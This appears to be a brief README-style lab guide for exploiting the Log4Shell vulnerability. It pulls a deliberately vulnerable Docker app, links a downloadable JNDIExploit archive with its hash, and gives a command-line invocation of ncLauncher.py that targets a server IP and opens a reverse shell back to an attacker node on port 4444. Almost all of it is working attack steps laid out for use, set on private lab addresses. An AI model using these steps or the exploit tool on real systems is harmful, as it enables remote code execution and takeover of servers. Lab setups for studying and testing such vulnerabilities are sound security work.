## Setup a vulnerable environment
```
docker pull ghcr.io/christophetd/log4shell-vulnerable-app:latest
docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```

## Locate an example of the exploit
```
https://download1320.mediafire.com/8nkrfr49l20g/dm0qgwujkwcy585/JNDIExploit.v1.2.zip
f04eb18c91314b1d9f7d02a2b64a7aa2ccc5134e24c135c54dae5205b90a653b1ec97aeb6e0ea0e288d791e81056e3e14f92ca7171c02cbd6c472247f1c9caaa  JNDIExploit.v1.2.zip
```

## Pop a shell
Where 192.168.10.151 is the node to run the attack from and 192.168.10.94 is the vulnerable server:
```
python3 ./ncLauncher.py --hip 192.168.10.151 --hpt 8080 --lip 192.168.10.151 --lpt 1389 --nip 192.168.10.151 --npt 4444 --tip 192.168.10.94 --tpt 8080
```
